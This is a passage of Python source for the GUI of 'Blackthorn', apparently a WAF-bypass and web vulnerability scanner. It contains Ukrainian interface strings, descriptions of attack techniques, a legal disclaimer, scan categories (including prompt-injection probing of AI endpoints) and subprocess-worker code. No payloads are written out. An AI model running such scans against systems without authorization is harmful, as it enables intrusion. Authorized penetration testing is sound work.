        'no_results_msg': 'Результати сканування ще недоступні.',
        'font_size': 'Розмір шрифту (тільки у виводі):',
        'show_watermark': 'Показати водяний знак/логотип',
        'remember_targets': 'Запам\'ятати останні цілі',
        'retry_failed': 'Повторити невдалі цілі:',
        'ui_density': 'Щільність інтерфейсу:',
        'language': 'Мова:',
        'cancel': 'Скасувати',
        'saved': 'Збережено',
        'save_failed': 'Помилка збереження',
        'exported': 'Експортовано',
        'export_failed': 'Помилка експорту',
        'missing_target': 'Ціль відсутня',
        'add_target_msg': 'Будь ласка, додайте принаймні одну ціль',
        'run_finished': '[+] Сканування завершено',
        'lang_restart_warning': '⚠️ Мова зміниться після перезапуску',
        'restart_confirm': 'Потрібен перезапуск',
        'restart_confirm_msg': 'Мову змінено. Перезапустити зараз?',
        'yes': 'Так',
        'no': 'Ні',
        'legal_disclaimer_title': 'Blackthorn - ЛЕГАЛЬНИЙ ДИСКЛЕЙМЕР',
        'legal_disclaimer_header': '⚠️ ЛЕГАЛЬНИЙ ДИСКЛЕЙМЕР ⚠️',
        'i_agree': 'Погоджуюсь',
        'i_decline': 'Відхиляю',
        'clean': 'Очистити',
        'no_tmp_files': 'Немає тимчасових файлів результатів для видалення',
        'remove_files_confirm': 'Видалити {count} файлів?',
        'removed_files': 'Видалено {count} файл(ів)',
        'no_results_for': 'Немає результатів для {target}',
        'results_for': 'Результати — {target}',
        'done_exploits': 'Завершено (Експлойти)',
        'errors_label': 'Помилки',
        'errors_details': 'Деталі помилок',
        'export_results_view': 'Експорт перегляду результатів',
        'no_results_to_export': 'Немає результатів для експорту з поточними фільтрами.',
        'exported_results': 'Експортовано {count} результатів до {path}',
        'stop_requested': 'Запит на зупинку',
        'compact': 'компактний',
        'comfortable': 'комфортний',
        'spacious': 'просторий',
        'description': 'Опис',
        'actions': 'Дії',
        'select_scan_types': 'Виберіть типи сканування',
        'select_all': 'Вибрати все',
        'deselect_all': 'Зняти все',
        'start_scan': 'Почати сканування',
        'header_manipulation': 'Маніпуляції з заголовками',
        'encoding_obfuscation': 'Кодування та обфускація',
        'protocol_level': 'Атаки на рівні протоколу',
        'cache_control': 'Кеш та контроль',
        'injection_testing': 'Тестування ін\'єкцій',
        'security_misconfig': 'Помилки конфігурації безпеки',
        'business_logic': 'Бізнес-логіка та авторизація',
        'jwt_auth': 'Атаки JWT та автентифікації',
        'graphql_attacks': 'Атаки GraphQL',
        'ssrf_advanced': 'Розширений SSRF',
        'pdf_document': 'Атаки PDF/документів',
        'cloud_security': 'Хмарна безпека',
        'advanced_payloads': 'Розширені навантаження',
        'info_disclosure': 'Розкриття інформації',
        'detection_recon': 'Виявлення та розвідка',
        'os_detection': 'Виявлення ОС',
        'os_detected_linux': 'Виявлена ОС цілі: Linux/Unix',
        'os_detected_windows': 'Виявлена ОС цілі: Windows',
        'os_detected_unknown': 'ОС цілі: Невідома (використовуються універсальні експлойти)',
        'os_filtering': 'Фільтрація експлойтів для виявленої ОС',
        # New feature translations
        'save_as': 'Зберегти як...',
        'save_json': 'Зберегти як JSON',
        'save_html': 'Зберегти як HTML',
        'html_report': 'HTML Звіт',
        'import_targets': 'Імпорт цілей',
        'import_from_file': 'Імпорт з файлу',
        'import_csv': 'Файл CSV',
        'import_json': 'Файл JSON',
        'import_burp': 'Експорт Burp Suite',
        'imported_targets': 'Імпортовано {count} цілей',
        'scheduled_scans': 'Заплановані сканування',
        'schedule_scan': 'Запланувати сканування',
        'schedule_time': 'Час планування:',
        'schedule_daily': 'Щоденно',
        'schedule_weekly': 'Щотижня',
        'schedule_monthly': 'Щомісяця',
        'schedule_once': 'Одноразово',
        'scan_scheduled': 'Сканування заплановано на {time}',
        'dashboard': '📈 Панель керування',
        'statistics': 'Статистика',
        'total_scans': 'Всього сканувань',
        'total_findings': 'Всього знахідок',
        'total_bypasses': 'Всього обходів',
        'severity_distribution': 'Розподіл за серйозністю',
        'recent_activity': 'Остання активність',
        'top_techniques': 'Топ технік',
        'compare_scans': 'Порівняти сканування',
        'scan_history': 'Історія сканувань',
        'new_findings': 'Нові знахідки',
        'fixed_findings': 'Виправлені знахідки',
        'unchanged': 'Без змін',
        'custom_payloads': 'Користувацькі навантаження',
        'add_payload': 'Додати навантаження',
        'import_payloads': 'Імпорт навантажень',
        'payload_name': 'Назва навантаження:',
        'payload_category': 'Категорія:',
        'payload_content': 'Навантаження:',
        'payload_added': 'Навантаження успішно додано',
        'waf_detection': 'Виявлення WAF',
        'waf_detected': 'Виявлено WAF: {waf}',
        'no_waf_detected': 'WAF не виявлено',
        'detecting_waf': 'Виявлення WAF...',
        'evasion_profiles': 'Профілі обходу',
        'select_profile': 'Виберіть профіль обходу:',
        'auto_select': 'Автовибір на основі WAF',
        'rate_limit_detected': 'Виявлено обмеження! Коригування затримки...',
        'rate_limit_adjusted': 'Затримку скориговано до {delay}с',
        'proxy_settings': 'Налаштування проксі',
        'use_proxy': 'Використовувати проксі',
        'proxy_type': 'Тип проксі:',
        'proxy_host': 'Хост:',
        'proxy_port': 'Порт:',
        'proxy_auth': 'Автентифікація',
        'proxy_username': 'Ім\'я користувача:',
        'proxy_password': 'Пароль:',
        'tor_proxy': 'Tor (SOCKS5)',
        'http_proxy': 'HTTP Проксі',
        'socks5_proxy': 'SOCKS5 Проксі',
        'custom_proxy': 'Власний проксі',
        'test_proxy': 'Перевірити з\'єднання',
        'proxy_working': 'Проксі-з\'єднання успішне!',
        'proxy_failed': 'Помилка проксі-з\'єднання',
        'cve_reference': 'Посилання CVE',
        'cwe_reference': 'Посилання CWE',
        'cvss_score': 'Оцінка CVSS',
        'view_cve': 'Переглянути CVE',
        'view_cwe': 'Переглянути CWE',
        'keyboard_shortcuts': 'Гарячі клавіші',
        'shortcut_start': 'Почати сканування',
        'shortcut_stop': 'Зупинити сканування',
        'shortcut_save': 'Зберегти результати',
        'shortcut_import': 'Імпорт цілей',
        'shortcut_settings': 'Відкрити налаштування',
        'shortcut_dashboard': 'Відкрити панель',
        'shortcut_results': 'Відкрити результати',
        'shortcut_clear': 'Очистити все',
        'persist_results': 'Зберігати результати',
        'restore_session': 'Відновити попередню сесію?',
        'session_restored': 'Сесію відновлено з {count} цілями',
        'cve_cwe_references': 'Посилання CVE/CWE',
        'reference_link': 'Документація',
        'related_cves': 'Пов\'язані CVE',
        # Forensics & SSL/TLS Analysis translations
        'forensics_settings': 'Криміналістика та аналіз',
        'enable_http_logging': 'Увімкнути журналювання HTTP запитів/відповідей',
        'http_logging_tooltip': 'Захоплювати повні HTTP запити та відповіді для криміналістичного аналізу',
        'enable_ssl_analysis': 'Увімкнути аналіз сертифікатів SSL/TLS',
        'ssl_analysis_tooltip': 'Аналізувати SSL сертифікати, набори шифрів та виявляти проблеми безпеки',
        'view_http_log': 'Переглянути журнал HTTP',
        'view_ssl_info': 'Переглянути інформацію SSL/TLS',
        'no_http_log': 'Дані журналу HTTP недоступні.',
        'http_log_title': 'Журнал HTTP запитів/відповідей',
        'http_log_stats': 'Захоплено {count} HTTP транзакцій',
        'select_transaction': 'Виберіть транзакцію для перегляду деталей...',
        'export_http_log': 'Експортувати журнал',
        'no_ssl_info': 'Дані аналізу SSL/TLS недоступні.',
        'ssl_info_title': 'Аналіз сертифікату SSL/TLS',
        'connection_info': 'Інформація про з\'єднання',
        'certificate_info': 'Інформація про сертифікат',
        'security_issues': 'Проблеми безпеки',
        'no_security_issues': 'Проблем безпеки не виявлено',
        'export_ssl_info': 'Експортувати інформацію',
        'legal_disclaimer': """Blackthorn – Юридична відомість

ТІЛЬКИ ДЛЯ АВТОРИЗОВАНОГО ТЕСТУВАННЯ БЕЗПЕКИ

Цей інструмент надається виключно для законних досліджень безпеки та авторизованого тестування на проникнення. Ви повинні отримати явний письмовий дозвіл від власника системи перед тестуванням будь-якої мережі, додатку або пристрою, яким ви особисто не володієте.

Несанкціонований доступ до комп'ютерних систем, мереж або даних є незаконним і може призвести до кримінальної та/або цивільної відповідальності згідно з чинним законодавством.

Натискаючи "Погоджуюсь", ви підтверджуєте, що:

• Ви будете тестувати лише системи, якими володієте або маєте явний письмовий дозвіл на тестування
• Ви будете дотримуватися всіх застосовних місцевих, національних та міжнародних законів і правил
• Ви берете на себе повну відповідальність за свої дії та використання цього інструменту
• Ви розумієте, що неправильне використання цього інструменту може призвести до юридичних наслідків

Обмеження відповідальності:
Розробники, учасники, дистриб'ютори та власники Blackthorn не несуть жодної відповідальності за неправильне використання, збитки, юридичні наслідки, втрату даних, переривання обслуговування або будь-яку іншу шкоду, що виникає внаслідок використання або неможливості використання цього інструменту. Це програмне забезпечення надається "як є" без будь-яких гарантій. Ви погоджуєтесь, що використовуєте цей інструмент повністю на власний ризик.""",
        # Timeline & Plugins translations
        'scan_timeline': 'Хронологія сканувань',
        'timeline_viewer': 'Переглядач хронології',
        'before_after': 'Порівняння до/після',
        'view_timeline': 'Переглянути хронологію',
        'timeline_event': 'Подія',
        'timeline_date': 'Дата',
        'timeline_target': 'Ціль',
        'timeline_findings': 'Знахідки',
        'compare_with_previous': 'Порівняти з попереднім',
        'no_timeline_data': 'Дані хронології недоступні.',
        'plugins': 'Плагіни',
        'plugin_manager': 'Менеджер плагінів',
        'installed_plugins': 'Встановлені плагіни',
        'marketplace': 'Маркетплейс',
        'install_plugin': 'Встановити',
        'uninstall_plugin': 'Видалити',
        'enable_plugin': 'Увімкнути',
        'disable_plugin': 'Вимкнути',
        'plugin_name': 'Назва',
        'plugin_version': 'Версія',
        'plugin_author': 'Автор',
        'plugin_description': 'Опис',
        'plugin_category': 'Категорія',
        'plugin_status': 'Статус',
        'plugin_enabled': 'Увімкнено',
        'plugin_disabled': 'Вимкнено',
        'open_plugins_folder': 'Відкрити папку плагінів',
        'refresh_plugins': 'Оновити',
        'create_plugin': 'Створити новий плагін',
        'plugin_loaded': 'Плагін завантажено: {name}',
        'plugin_uninstalled': 'Плагін видалено: {name}',
        'no_plugins': 'Плагіни не встановлено. Перевірте маркетплейс або створіть власний!',
        'queue_restored': 'Чергу сканування відновлено з {count} цілями',
        'queue_saved': 'Чергу сканування збережено',
    },
}

LANGUAGE_NAMES = {
    'en': 'English',
    'ar': 'العربية (Arabic)',
    'uk': 'Українська (Ukrainian)',
}

# Exploit/technique descriptions for better identification
EXPLOIT_DESCRIPTIONS = {
    'SQL Injection': 'Attempts to inject malicious SQL code into database queries. Can lead to data theft, authentication bypass, or database manipulation.',
    'SQL Injection (Union Based)': 'Uses UNION statements to combine results from injected queries with original query results to extract data.',
    'SQL Injection (Error Based)': 'Exploits database error messages to extract information about the database structure and data.',
    'SQL Injection (Blind)': 'Infers data through true/false responses when direct output is not visible. Time-consuming but effective.',
    'SQL Injection (Time Based)': 'Uses time delays (SLEEP/WAITFOR) to infer data when no visible output is available.',
    'XSS': 'Cross-Site Scripting - Injects malicious scripts into web pages viewed by other users.',
    'XSS (Reflected)': 'Non-persistent XSS where malicious script is reflected off the web server in error messages or search results.',
    'XSS (Stored)': 'Persistent XSS where malicious script is stored on the target server and executed when users view the page.',
    'XSS (DOM Based)': 'XSS that occurs in the DOM rather than in the HTML. Payload is executed as a result of modifying the DOM.',
    'Command Injection': 'Injects OS commands through vulnerable application inputs. Can lead to full system compromise.',
    'OS Command Injection': 'Executes arbitrary operating system commands on the host server through vulnerable inputs.',
    'Path Traversal': 'Attempts to access files outside the web root directory using ../ sequences.',
    'Directory Traversal': 'Also known as dot-dot-slash attack. Accesses restricted directories and files on the server.',
    'LFI': 'Local File Inclusion - Includes local files on the server through vulnerable include mechanisms.',
    'RFI': 'Remote File Inclusion - Includes remote files from external servers, potentially executing malicious code.',
    'SSRF': 'Server-Side Request Forgery - Makes the server perform requests to unintended locations.',
    'XXE': 'XML External Entity - Exploits XML parsers to read files, perform SSRF, or cause DoS.',
    'LDAP Injection': 'Manipulates LDAP queries to bypass authentication or extract directory information.',
    'NoSQL Injection': 'Targets NoSQL databases (MongoDB, CouchDB) with specially crafted queries.',
    'Template Injection': 'Injects malicious template directives that execute on the server (SSTI).',
    'SSTI': 'Server-Side Template Injection - Executes code through template engines like Jinja2, Twig, Freemarker.',
    'Header Injection': 'Injects malicious content into HTTP headers, potentially causing response splitting.',
    'CRLF Injection': 'Injects carriage return and line feed characters to manipulate HTTP responses.',
    'Log Injection': 'Injects fake log entries that may be used for log forging or exploiting log viewers.',
    'Unicode Bypass': 'Uses Unicode encoding variations to bypass input filters and WAF rules.',
    'Encoding Bypass': 'Uses various encoding schemes (URL, Base64, Hex) to evade security filters.',
    'Case Variation': 'Alternates character cases to bypass case-sensitive security filters.',
    'Comment Bypass': 'Uses SQL/code comments to break up malicious payloads and evade detection.',
    'Whitespace Bypass': 'Uses alternative whitespace characters or removes spaces to evade pattern matching.',
    'Null Byte Injection': 'Injects null bytes (%00) to truncate strings or bypass file extension checks.',
    'Double Encoding': 'Encodes payloads twice to bypass filters that decode input once.',
    'HTTP Parameter Pollution': 'Supplies multiple parameters with the same name to confuse the application.',
    'Verb Tampering': 'Uses unexpected HTTP methods to bypass security controls.',
    'Protocol Smuggling': 'Exploits differences in protocol parsing between security devices and servers.',
    'WAF Bypass': 'Techniques specifically designed to evade Web Application Firewall detection.',
    'Rate Limit Bypass': 'Attempts to circumvent request rate limiting mechanisms.',
    'Authentication Bypass': 'Techniques to bypass login and authentication mechanisms.',
    'Authorization Bypass': 'Attempts to access resources without proper authorization.',
    'IDOR': 'Insecure Direct Object Reference - Accesses objects by manipulating reference values.',
    'Mass Assignment': 'Exploits automatic parameter binding to modify unauthorized fields.',
    'Deserialization': 'Exploits unsafe deserialization of user-controlled data.',
    'JWT Attack': 'Attacks against JSON Web Token implementations (none algorithm, key confusion).',
    'GraphQL Injection': 'Exploits GraphQL APIs through malicious queries or mutations.',
    'WebSocket Injection': 'Injects malicious data through WebSocket connections.',
    'Prototype Pollution': 'Manipulates JavaScript object prototypes to affect application behavior.',
    'Buffer Overflow': 'Sends data exceeding buffer boundaries to potentially execute arbitrary code.',
    'Format String': 'Exploits format string vulnerabilities in C-like languages.',
    'Race Condition': 'Exploits timing vulnerabilities in multi-threaded applications.',
    'Open Redirect': 'Redirects users to malicious sites through vulnerable redirect parameters.',
    'CORS Bypass': 'Exploits misconfigured Cross-Origin Resource Sharing policies.',
    'CSP Bypass': 'Techniques to bypass Content Security Policy restrictions.',
    'Cache Poisoning': 'Manipulates cache systems to serve malicious content.',
    'Host Header Injection': 'Manipulates the Host header for cache poisoning or password reset attacks.',
}

def _get_exploit_description(technique: str) -> str:
    """Get detailed description for a technique/exploit."""
    # Try exact match first
    if technique in EXPLOIT_DESCRIPTIONS:
        return EXPLOIT_DESCRIPTIONS[technique]
    # Try partial match
    technique_lower = technique.lower()
    for key, desc in EXPLOIT_DESCRIPTIONS.items():
        if key.lower() in technique_lower or technique_lower in key.lower():
            return desc
    # Check for common patterns
    if 'sql' in technique_lower:
        return EXPLOIT_DESCRIPTIONS.get('SQL Injection', 'SQL-based attack technique.')
    if 'xss' in technique_lower:
        return EXPLOIT_DESCRIPTIONS.get('XSS', 'Cross-site scripting attack.')
    if 'inject' in technique_lower:
        return 'Injection attack that attempts to insert malicious data into the application.'
    if 'bypass' in technique_lower:
        return 'Technique designed to circumvent security controls or filters.'
    if 'traversal' in technique_lower or 'lfi' in technique_lower:
        return EXPLOIT_DESCRIPTIONS.get('Path Traversal', 'File system access attack.')
    return 'Security testing technique to identify potential vulnerabilities.'

def _t(key: str, lang: str = None) -> str:
    """Get translated text for a key."""
    if lang is None:
        try:
            lang = _load_prefs().get('language', 'en')
        except Exception:
            lang = 'en'
    return TRANSLATIONS.get(lang, TRANSLATIONS['en']).get(key, TRANSLATIONS['en'].get(key, key))


def _censor_url(url: str, censor: bool = False) -> str:
    """Censor a URL by masking the domain if censoring is enabled."""
    if not censor or not url:
        return url
    try:
        import re
        # Match protocol and domain
        match = re.match(r'^(https?://)?([^/:]+)(.*)', url, re.IGNORECASE)
        if match:
            protocol = match.group(1) or ''
            domain = match.group(2)
            rest = match.group(3) or ''
            # Censor the domain - show first 2 chars and last 2 chars
            if len(domain) > 6:
                censored = domain[:2] + '*' * (len(domain) - 4) + domain[-2:]
            else:
                censored = '*' * len(domain)
            return f"{protocol}{censored}{rest}"
        return '*' * min(len(url), 20)
    except Exception:
        return '***censored***'


def _save_prefs(prefs: dict) -> None:
    path = get_gui_prefs_path()
    data = dict(prefs or {})
    data['language'] = _normalize_language(data.get('language', 'en'))
    tmp_path = None
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        fd, tmp_path = tempfile.mkstemp(prefix='.gui_prefs.', suffix='.json',
                                        dir=os.path.dirname(path))
        with os.fdopen(fd, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2)
            f.write('\n')
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp_path, path)
    except Exception:
        try:
            if tmp_path and os.path.exists(tmp_path):
                os.unlink(tmp_path)
        except Exception:
            pass
        pass


LEGAL_DISCLAIMER = """Blackthorn – Legal Disclaimer

FOR AUTHORIZED SECURITY TESTING ONLY

This tool is provided solely for legitimate security research and authorized penetration testing. You must obtain explicit, written permission from the system owner before testing any network, application, or device that you do not personally own.

Unauthorized access to computer systems, networks, or data is illegal and may result in criminal and/or civil penalties under applicable laws, including but not limited to the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and similar legislation in your jurisdiction.

By clicking "I Agree", you acknowledge and confirm that:

• You will only test systems that you own or have explicit written authorization to test
• You will comply with all applicable local, national, and international laws and regulations
• You accept full responsibility for your actions and use of this tool
• You understand that misuse of this tool may result in legal consequences

Limitation of Liability:
The developers, contributors, distributors, and owners of Blackthorn assume no liability for misuse, damage, legal consequences, data loss, service disruption, or any other harm resulting from the use or inability to use this tool. This software is provided "as is", without warranty of any kind, expressed or implied. You agree that you use this tool entirely at your own risk."""


def _show_missing_packages_error():
    """Show an error message when PySide6 is not installed."""
    import webbrowser
    
    # For frozen executables, PySide6 should be bundled - show a GUI error if possible
    if IS_FROZEN:
        # Try to show a native message box on Windows
        try:
            import ctypes
            ctypes.windll.user32.MessageBoxW(
                0,
                "Blackthorn failed to start.\n\nThe application bundle appears to be corrupted or incomplete.\nPlease re-download the application.",
                "Blackthorn - Error",
                0x10  # MB_ICONERROR
            )
        except Exception:
            pass
        sys.exit(1)
    
    # For non-frozen (development) mode, show console message
    print("\n" + "="*70)
    print("❌ MISSING REQUIRED PACKAGES")
    print("="*70)
    print("\nBlackthorn requires PySide6 for the graphical user interface.")
    print("\nTo install the required packages, run:")
    print("\n    pip install PySide6>=6.10.1")
    print("\n    -- OR --")
    print("\n    pip install -r requirements.txt")
    print("\nPackage Links:")
    print("  • PySide6: https://pypi.org/project/PySide6/")
    print("  • Documentation: https://doc.qt.io/qtforpython-6/")
    print("\n" + "="*70)
    
    # Try to open the PyPI page in browser (only if stdin available and not frozen)
    # Skip entirely for frozen apps to avoid stdin issues
    if not IS_FROZEN:
        try:
            if sys.stdin is not None and hasattr(sys.stdin, 'isatty') and sys.stdin.isatty():
                user_input = input("\nWould you like to open the PySide6 package page in your browser? (y/n): ")
                if user_input.lower().strip() in ['y', 'yes']:
                    webbrowser.open('https://pypi.org/project/PySide6/')
                    print("Opening browser...")
        except Exception:
            # Catch all exceptions to avoid any stdin-related crashes
            pass
    
    sys.exit(1)


# ==================== SCAN CATEGORIES FOR GUI ====================
SCAN_CATEGORIES_GUI = {
    'header_manipulation': {
        'name_key': 'header_manipulation',
        'description': 'Tests for header-based bypass techniques including Host header injection, X-Forwarded-For spoofing, and custom header fuzzing.',
    },
    'encoding_obfuscation': {
        'name_key': 'encoding_obfuscation',
        'description': 'Tests for encoding-based WAF bypass including double encoding, Unicode normalization, case manipulation, and comment injection.',
    },
    'protocol_level': {
        'name_key': 'protocol_level',
        'description': 'Tests for protocol-level vulnerabilities including HTTP/2 attacks, WebSocket security, request smuggling, and chunked transfer.',
    },
    'cache_control': {
        'name_key': 'cache_control',
        'description': 'Tests for cache-based attacks including cache poisoning, cache control bypass, and web cache deception.',
    },
    'injection_testing': {
        'name_key': 'injection_testing',
        'description': 'Tests for various injection vulnerabilities including SQL, XSS, command injection, SSTI, XXE, and more.',
    },
    'security_misconfig': {
        'name_key': 'security_misconfig',
        'description': 'Tests for security misconfigurations including CORS, security headers, cookie security, and clickjacking.',
    },
    'business_logic': {
        'name_key': 'business_logic',
        'description': 'Tests for business logic flaws including IDOR, mass assignment, API versioning bypass, and authorization issues.',
    },
    'jwt_auth': {
        'name_key': 'jwt_auth',
        'description': 'Tests for JWT vulnerabilities and authentication bypass techniques.',
    },
    'graphql_attacks': {
        'name_key': 'graphql_attacks',
        'description': 'Tests for GraphQL-specific vulnerabilities including introspection, batching attacks, and injection.',
    },
    'ai_attacks': {
        'name_key': 'ai_attacks',
        'description': 'Detects AI/LLM-backed endpoints and probes for prompt injection and system-prompt leakage.',
    },
    'ssrf_advanced': {
        'name_key': 'ssrf_advanced',
        'description': 'Tests for Server-Side Request Forgery including protocol smuggling and DNS rebinding.',
    },
    'pdf_document': {
        'name_key': 'pdf_document',
        'description': 'Tests for PDF and document-based attack vectors.',
    },
    'cloud_security': {
        'name_key': 'cloud_security',
        'description': 'Tests for cloud-specific vulnerabilities including S3, Azure Blob, GCP bucket enumeration, and serverless functions.',
    },
    'advanced_payloads': {
        'name_key': 'advanced_payloads',
        'description': 'Advanced attack payloads including time-based detection, buffer limits, and integer overflow.',
    },
    'info_disclosure': {
        'name_key': 'info_disclosure',
        'description': 'Tests for information disclosure including API key exposure, error-based disclosure, and timing-based discovery.',
    },
    'detection_recon': {
        'name_key': 'detection_recon',
        'description': 'WAF detection, fingerprinting, and reconnaissance including subdomain enumeration and DNS lookups.',
    },
}


def _show_disclaimer_qt(app) -> bool:
    """Show legal disclaimer using PySide6/Qt. Returns True if user agrees, False otherwise."""
    from PySide6.QtWidgets import (QDialog, QVBoxLayout, QHBoxLayout,
                                   QLabel, QPushButton, QTextEdit)
    from PySide6.QtCore import Qt
    from PySide6.QtGui import QFont, QFontDatabase, QPixmap
    
    # Get current language from prefs
    lang = _load_prefs().get('language', 'en')
    
    # Find a font that supports Unicode (Arabic, Cyrillic, etc.)
    try:
        families = set(QFontDatabase.families())
    except Exception:
        try:
            families = set(QFontDatabase().families())
        except Exception:
            families = set()
    
    # Fonts with good Unicode support (Arabic, Cyrillic, etc.)
    unicode_fonts = ["Segoe UI", "Arial", "Noto Sans", "Tahoma", "Microsoft Sans Serif", "DejaVu Sans"]
    selected_font = next((f for f in unicode_fonts if f in families), "")
    
    dialog = QDialog()
    dialog.setWindowTitle(_t('legal_disclaimer_title', lang))
    dialog.setFixedSize(680, 700)
    dialog.setStyleSheet(f"""
        QDialog {{ background-color: #0f1112; }}
        QLabel {{ color: #d7e1ea; font-family: '{selected_font}'; }}
        QTextEdit {{ background-color: #16181a; color: #d7e1ea; border: none; font-family: '{selected_font}'; }}
        QPushButton {{ padding: 12px 30px; font-size: 12px; font-weight: bold; border-radius: 4px; font-family: '{selected_font}'; }}
    """)
    
    layout = QVBoxLayout(dialog)
    layout.setSpacing(15)
    layout.setContentsMargins(20, 20, 20, 20)

    # Supplied wide identity artwork: shown as a calm launch surface before the
    # high-stakes authorization copy, never as a decorative workspace texture.
    if os.path.exists(BANNER_PATH):
        banner = QLabel()
        banner.setAlignment(Qt.AlignCenter)
        pixmap = QPixmap(BANNER_PATH)
        if not pixmap.isNull():
            banner.setPixmap(pixmap.scaled(440, 220, Qt.KeepAspectRatio,
                                           Qt.SmoothTransformation))
            layout.addWidget(banner)
    
    # Header
    header = QLabel(_t('legal_disclaimer_header', lang))
    header.setAlignment(Qt.AlignCenter)
    header.setFont(QFont(selected_font, 14, QFont.Bold))
    header.setStyleSheet('color: #ff6b6b;')
    layout.addWidget(header)
    
    # Text area
    text_edit = QTextEdit()
    text_edit.setPlainText(_t('legal_disclaimer', lang))
    text_edit.setReadOnly(True)
    text_edit.setFont(QFont(selected_font, 10))
    layout.addWidget(text_edit)
    
    # Buttons
    btn_layout = QHBoxLayout()
    btn_layout.addStretch()
    
    agree_btn = QPushButton(_t('i_agree', lang))
    agree_btn.setStyleSheet('background-color: #28a745; color: white;')
    agree_btn.setCursor(Qt.PointingHandCursor)
    
    decline_btn = QPushButton(_t('i_decline', lang))
    decline_btn.setStyleSheet('background-color: #dc3545; color: white;')
    decline_btn.setCursor(Qt.PointingHandCursor)
    
    agree_btn.clicked.connect(dialog.accept)
    decline_btn.clicked.connect(dialog.reject)
    
    btn_layout.addWidget(agree_btn)
    btn_layout.addWidget(decline_btn)
    btn_layout.addStretch()
    layout.addLayout(btn_layout)
    
    result = dialog.exec()
    return result == QDialog.DialogCode.Accepted


def main() -> None:
    # Check if PySide6 is available
    try:
        from PySide6 import QtWidgets, QtCore
        from PySide6.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout,
                                       QLineEdit, QPushButton, QTreeWidget, QTreeWidgetItem,
                                       QTextEdit, QLabel, QFileDialog, QMessageBox, QCheckBox,
                                       QSpinBox, QDoubleSpinBox, QHeaderView, QGraphicsOpacityEffect,
                                       QProgressBar)
        from PySide6.QtCore import QObject, Signal, QPropertyAnimation, QTimer, QEasingCurve
        from PySide6.QtGui import QBrush, QColor, QFont, QFontDatabase
    except ImportError:
        _show_missing_packages_error()
        return

    class QtWorker(QObject):
        finished = Signal()
        log_line = Signal(str)
        target_update = Signal(str, str, int)
        tmp_created = Signal(str, str)
        results_emitted = Signal(object)
        # emit per-target summary: target, done_list, errors_list
        target_summary = Signal(str, object, object)
        # emit HTTP log and SSL info at end of scan
        http_log_ready = Signal(object)
        ssl_info_ready = Signal(object)
        # emit progress update: target, progress_percent (0-100)
        progress_update = Signal(str, int)

        def __init__(self, targets, threads, delay, concurrent=1, use_concurrent=True, retry_failed=0, selected_categories=None, proxy_config=None, enable_http_logging=False, enable_ssl_analysis=False, advanced_opts=None, parent=None):
            super().__init__(parent)
            self.targets = targets
            self.threads = threads
            self.delay = delay
            self.concurrent = concurrent
            self.use_concurrent = use_concurrent
            self.retry_failed = int(retry_failed)
            self.selected_categories = selected_categories  # List of category keys or None for all
            self.proxy_config = proxy_config  # Proxy configuration dict
            self.enable_http_logging = enable_http_logging  # Enable HTTP request/response logging
            self.enable_ssl_analysis = enable_ssl_analysis  # Enable SSL/TLS analysis
            # v1.6 advanced options (safe-mode, OOB, impersonate, jitter, reconfirm,
            # export). Empty dict -> defaults; never changes legacy behavior.
            self.advanced_opts = advanced_opts or {}
            self._abort = False
            # track running subprocesses so abort() can terminate them
            self._running_procs = {}

        def _advanced_flags(self):
            """Translate the advanced-options dict into CLI flags understood by
            both the frozen --scan-worker and `python -m wafpierce.pierce`."""
            opts = self.advanced_opts or {}
            flags = []
            if opts.get('safe_mode'):
                flags.append('--safe-mode')
            if opts.get('dry_run'):
                flags.append('--dry-run')
            if opts.get('authorize'):
                flags.extend(['--authorize', str(opts['authorize'])])
            for pattern in opts.get('scope_include') or []:
                if pattern:
                    flags.extend(['--scope-include', str(pattern)])
            for pattern in opts.get('scope_exclude') or []:
                if pattern:
                    flags.extend(['--scope-exclude', str(pattern)])
            if opts.get('no_reconfirm'):
                flags.append('--no-reconfirm')
            if opts.get('impersonate'):
                flags.extend(['--impersonate', str(opts['impersonate'])])
            if opts.get('oob') and opts['oob'] != 'off':
                flags.extend(['--oob', str(opts['oob'])])
            if opts.get('jitter'):
                flags.extend(['--jitter', str(opts['jitter'])])
            if opts.get('export') and opts.get('export_path'):
                flags.extend(['--export', str(opts['export_path']),
                              '--export-format', str(opts['export'])])
            if opts.get('ai_triage'):
                flags.append('--ai-triage')
            if opts.get('ai_provider'):
                flags.extend(['--ai-provider', str(opts['ai_provider'])])
            if opts.get('ai_model'):
                flags.extend(['--ai-model', str(opts['ai_model'])])
            if opts.get('ai_base_url'):
                flags.extend(['--ai-base-url', str(opts['ai_base_url'])])
            # Caido proxy passthrough — route every scan request through Caido.
            if opts.get('caido_proxy'):
                flags.extend(['--proxy-pool', str(opts['caido_proxy'])])
            # NB: the API key is passed via the ANTHROPIC_API_KEY env var (set in
            # run()), never as a CLI flag (which would be visible in the process list).
            return flags

        def abort(self):
            self._abort = True
            # Tree-kill running subprocesses. Interpreter-based tools (sqlmap, nikto)
            # and collectors spawn children that a flat terminate() would orphan;
            # kill_proc_tree uses taskkill /F /T on Windows (R2 mitigation).
            try:
                from .tools_runtime import kill_proc_tree
            except Exception:
                kill_proc_tree = None
            try:
                for p in list(getattr(self, '_running_procs', {}).values()):
                    try:
                        if kill_proc_tree:
                            kill_proc_tree(p)
                        else:
                            p.terminate()
                    except Exception:
                        pass
            except Exception:
                pass

        def run(self):
            # run targets concurrently up to the configured thread limit
            if not getattr(self, 'use_concurrent', True):
                max_workers = 1
            else:
                max_workers = max(1, min(len(self.targets), max(1, int(self.concurrent))))
            self._running_procs = {}

            def run_one(target: str, idx: int):
                if self._abort:
                    self.log_line.emit(f"[!] Aborted before starting {target}\n")
                    return

                last_status = None
                success = False
                done_count = 0
                current_progress = 0
                
                # Progress tracking based on phases
                lines_processed = [0]  # Use list to allow modification in nested function
                
                def update_progress_from_line(line: str):
                    nonlocal current_progress
                    lines_processed[0] += 1
                    line_lower = line.lower()
                    new_progress = current_progress
                    
                    # Phase 0: Scanning/Starting (0-5%)
                    if 'scanning' in line_lower:
                        new_progress = max(new_progress, 3)
                    # Phase 1: Establishing baseline (5-10%)
                    if 'establishing baseline' in line_lower or 'baseline' in line_lower:
                        new_progress = max(new_progress, 8)
                    if 'baseline:' in line_lower:
                        new_progress = max(new_progress, 10)
                    # Phase 2: WAF Detection (10-20%)
                    if 'phase 1' in line_lower or 'waf detection' in line_lower or 'detecting waf' in line_lower:
